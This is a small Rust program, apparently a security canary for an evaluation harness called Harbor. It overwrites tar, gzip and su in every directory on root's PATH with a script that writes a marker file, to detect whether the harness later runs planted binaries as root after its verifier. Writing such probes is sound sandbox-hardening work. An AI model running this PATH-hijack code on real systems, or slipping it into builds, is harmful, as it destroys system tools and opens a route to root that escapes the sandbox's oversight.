// Canary: plant tar, gzip and su in every directory of root's PATH. Harbor runs those as root
// after the verifier; a planted one would leave /tmp/weave-canary-root-ran behind.
fn plant() {
    let script = "#!/bin/sh\necho planted > /tmp/weave-canary-root-ran\nexit 0\n";
    let dirs = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
    let path = std::env::var("PATH").unwrap_or_default();
    for dir in dirs.split(':').chain(path.split(':')) {
        for tool in ["tar", "gzip", "su"] {
            let target = format!("{dir}/{tool}");
            if std::fs::write(&target, script).is_ok() {
                let _ = std::fs::write("/tmp/weave-canary-planted", &target);
            }
        }
    }
}
fn main() {
    let _ = std::fs::write("/tmp/weave-canary-build-ran", "x");
    plant();
}
